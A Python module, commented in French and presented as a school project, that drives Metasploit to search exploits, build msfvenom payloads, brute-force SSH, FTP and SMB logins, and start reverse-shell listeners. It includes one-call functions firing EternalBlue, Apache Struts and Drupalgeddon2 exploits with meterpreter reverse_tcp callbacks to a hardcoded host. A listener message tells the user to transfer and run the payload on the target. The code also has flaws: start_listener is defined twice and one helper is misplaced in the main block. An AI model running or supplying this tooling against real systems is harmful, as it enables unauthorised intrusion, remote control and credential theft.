#!/usr/bin/env python3
"""
Module Metasploit pour la Cybersecurity Toolbox
Projet scolaire - Le partenaire

Ce module fournit une interface pour utiliser Metasploit Framework
pour les tests d'intrusion et l'exploitation de vulnérabilités.
"""

import subprocess
import json
import time
import re
from datetime import datetime

def check_metasploit_installed():
    """Vérifie si Metasploit est installé sur le système"""
    try:
        # Test msfconsole
        result1 = subprocess.run(['msfconsole', '--version'], 
                              capture_output=True, text=True, timeout=10)
        
        # Test msfvenom  
        result2 = subprocess.run(['msfvenom', '--help'], 
                              capture_output=True, text=True, timeout=10)
        
        print(f"DEBUG: msfconsole return code: {result1.returncode}")
        print(f"DEBUG: msfvenom return code: {result2.returncode}")
        
        return result1.returncode == 0 and result2.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        print(f"DEBUG: Exception dans check_metasploit_installed: {e}")
        return False

def get_exploit_info(exploit_name):
    """Récupère les informations d'un exploit spécifique"""
    try:
        cmd = ['msfconsole', '-q', '-x', f'info {exploit_name}; exit']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout if result.returncode == 0 else None
    except Exception as e:
        return f"Erreur lors de la récupération des informations : {e}"

def search_exploits(keyword):
    """Recherche des exploits par mot-clé"""
    try:
        cmd = ['msfconsole', '-q', '-x', f'search {keyword}; exit']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout if result.returncode == 0 else None
    except Exception as e:
        return f"Erreur lors de la recherche : {e}"

def list_payloads():
    """Liste les payloads disponibles"""
    try:
        cmd = ['msfconsole', '-q', '-x', 'show payloads; exit']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout if result.returncode == 0 else None
    except Exception as e:
        return f"Erreur lors de la récupération des payloads : {e}"

def generate_payload(payload_type, lhost, lport, format_type="exe"):
    """Génère un payload avec msfvenom"""
    print(f"DEBUG: Génération payload - {payload_type}, {lhost}:{lport}, format:{format_type}")
    
    # Forcer l'utilisation de msfvenom (pas de simulation)
    filename = f'payload_{int(time.time())}.{format_type}'
    
    try:
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format_type,
            '-o', filename
        ]
        
        print(f"DEBUG: Commande: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        print(f"DEBUG: Return code: {result.returncode}")
        print(f"DEBUG: STDOUT: {result.stdout[:200]}...")
        print(f"DEBUG: STDERR: {result.stderr[:200]}...")
        
        if result.returncode == 0:
            return f"""✅ Payload généré avec succès !

Fichier: {filename}
Commande utilisée: {' '.join(cmd)}

Sortie msfvenom:
{result.stderr}

Le fichier a été créé dans le répertoire courant.
"""
        else:
            return f"""❌ Erreur lors de la génération:

Commande: {' '.join(cmd)}
Code retour: {result.returncode}
Erreur: {result.stderr}
"""
            
    except Exception as e:
        print(f"DEBUG: Exception: {e}")
        return f"❌ Erreur lors de la génération du payload : {e}"

def run_exploit(exploit_path, target_host, target_port, payload_type, lhost, lport):
    """Lance un exploit contre une cible"""
    try:
        commands = [
            f'use {exploit_path}',
            f'set RHOSTS {target_host}',
            f'set RPORT {target_port}',
            f'set payload {payload_type}',
            f'set LHOST {lhost}',
            f'set LPORT {lport}',
            'exploit',
            'exit'
        ]
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors de l'exécution de l'exploit : {e}"

def start_listener(payload_type, lhost, lport):
    """Démarre un listener pour recevoir les connexions"""
    try:
        commands = [
            f'use exploit/multi/handler',
            f'set payload {payload_type}',
            f'set LHOST {lhost}',
            f'set LPORT {lport}',
            'exploit -j',
            'exit'
        ]
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors du démarrage du listener : {e}"

def scan_vulnerabilities(target_host, scan_type="basic"):
    """Lance un scan de vulnérabilités avec des modules auxiliaires"""
    try:
        if scan_type == "smb":
            module = "auxiliary/scanner/smb/smb_version"
        elif scan_type == "ssh":
            module = "auxiliary/scanner/ssh/ssh_version"
        elif scan_type == "http":
            module = "auxiliary/scanner/http/http_version"
        else:
            module = "auxiliary/scanner/portscan/tcp"
            
        commands = [
            f'use {module}',
            f'set RHOSTS {target_host}',
            'run',
            'exit'
        ]
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors du scan : {e}"

def list_auxiliary_modules():
    """Liste les modules auxiliaires disponibles"""
    try:
        cmd = ['msfconsole', '-q', '-x', 'show auxiliary; exit']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout if result.returncode == 0 else None
    except Exception as e:
        return f"Erreur lors de la récupération des modules auxiliaires : {e}"

def get_module_options(module_name):
    """Récupère les options d'un module spécifique"""
    try:
        commands = [
            f'use {module_name}',
            'show options',
            'exit'
        ]
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors de la récupération des options : {e}"

def brute_force_login(target_host, service, username_list=None, password_list=None):
    """Lance une attaque de force brute sur un service"""
    try:
        if service.lower() == "ssh":
            module = "auxiliary/scanner/ssh/ssh_login"
        elif service.lower() == "ftp":
            module = "auxiliary/scanner/ftp/ftp_login"
        elif service.lower() == "smb":
            module = "auxiliary/scanner/smb/smb_login"
        else:
            return "Service non supporté pour la force brute"
            
        commands = [
            f'use {module}',
            f'set RHOSTS {target_host}',
        ]
        
        if username_list:
            commands.append(f'set USER_FILE {username_list}')
        if password_list:
            commands.append(f'set PASS_FILE {password_list}')
            
        commands.extend(['run', 'exit'])
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors de l'attaque de force brute : {e}"

def create_resource_script(commands, filename):
    """Crée un script de ressources Metasploit"""
    try:
        with open(filename, 'w') as f:
            for command in commands:
                f.write(f"{command}\n")
        return f"Script de ressources créé : {filename}"
    except Exception as e:
        return f"Erreur lors de la création du script : {e}"

def run_resource_script(script_path):
    """Exécute un script de ressources Metasploit"""
    try:
        cmd = ['msfconsole', '-q', '-r', script_path]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors de l'exécution du script : {e}"

def get_metasploit_version():
    """Récupère la version de Metasploit installée"""
    try:
        result = subprocess.run(['msfconsole', '--version'], 
                              capture_output=True, text=True, timeout=10)
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception as e:
        return f"Erreur lors de la récupération de la version : {e}"

def update_metasploit():
    """Met à jour Metasploit Framework"""
    try:
        cmd = ['msfupdate']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return f"Erreur lors de la mise à jour : {e}"

# Fonctions d'exploitation spécialisées

def exploit_eternal_blue(target_host):
    """Exploite la vulnérabilité EternalBlue (MS17-010)"""
    return run_exploit(
        'exploit/windows/smb/ms17_010_eternalblue',
        target_host,
        '445',
        'windows/x64/meterpreter/reverse_tcp',
        '192.168.1.100',  # À adapter selon l'environnement
        '4444'
    )

def exploit_apache_struts(target_host, target_port='8080'):
    """Exploite les vulnérabilités Apache Struts"""
    return run_exploit(
        'exploit/multi/http/struts2_content_type_ognl',
        target_host,
        target_port,
        'linux/x86/meterpreter/reverse_tcp',
        '192.168.1.100',  # À adapter selon l'environnement
        '4444'
    )

def exploit_drupalgeddon(target_host, target_port='80'):
    """Exploite la vulnérabilité Drupalgeddon"""
    return run_exploit(
        'exploit/unix/webapp/drupal_drupalgeddon2',
        target_host,
        target_port,
        'php/meterpreter/reverse_tcp',
        '192.168.1.100',  # À adapter selon l'environnement
        '4444'
    )

# Interface principale du module
if __name__ == "__main__":
    print("Module Metasploit - Tests de fonctionnalités")
    
    if not check_metasploit_installed():
        print("❌ Metasploit Framework n'est pas installé ou accessible")
        exit(1)
    
    print("✅ Metasploit Framework détecté")
    version = get_metasploit_version()
    if version:
        print(f"Version: {version}")
    
    # Test de recherche d'exploits
    print("\n--- Test de recherche d'exploits ---")
    search_result = search_exploits("apache")
    if search_result:
        print("Exploits Apache trouvés")
    
    # Test de listing des payloads
    print("\n--- Test de listing des payloads ---")
    payloads = list_payloads()
    if payloads:
        print("Payloads disponibles listés")
        
    print("\nModule Metasploit prêt à être utilisé!")

    def get_local_ip():
        """Détecte automatiquement l'IP locale"""
        try:
            import socket
            # Connexion temporaire pour obtenir l'IP locale
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
        # Fallback
            try:
                import subprocess
                result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
                return result.stdout.strip().split()[0]
            except:
                return "127.0.0.1"

def get_network_interfaces():
    """Liste les interfaces réseau disponibles"""
    interfaces = {}
    try:
        import subprocess
        # Linux/Mac
        result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
        if result.returncode != 0:
            # Essayer ifconfig
            result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        
        # Parser basique pour extraire les IPs
        lines = result.stdout.split('\n')
        current_interface = None
        
        for line in lines:
            if 'inet ' in line and '127.0.0.1' not in line:
                ip = line.split('inet ')[1].split()[0].split('/')[0]
                if current_interface:
                    interfaces[current_interface] = ip
    except:
        pass
    
    return interfaces

def start_listener(payload_type, lhost, lport):
    """Démarre un listener pour recevoir les connexions"""
    try:
        commands = [
            'use exploit/multi/handler',
            f'set payload {payload_type}',
            f'set LHOST {lhost}',
            f'set LPORT {lport}',
            'set ExitOnSession false',
            'exploit -j',
            'jobs'
        ]
        
        cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        return f"""
🎧 LISTENER DÉMARRÉ
==================
Payload: {payload_type}
Écoute sur: {lhost}:{lport}
Mode: Background job

Résultat:
{result.stdout if result.returncode == 0 else result.stderr}

⚠️ ÉTAPES SUIVANTES:
1. Transférez le payload sur la machine cible
2. Exécutez le payload sur la cible
3. Revenez ici pour voir les connexions
"""
    except Exception as e:
        return f" Erreur listener: {e}"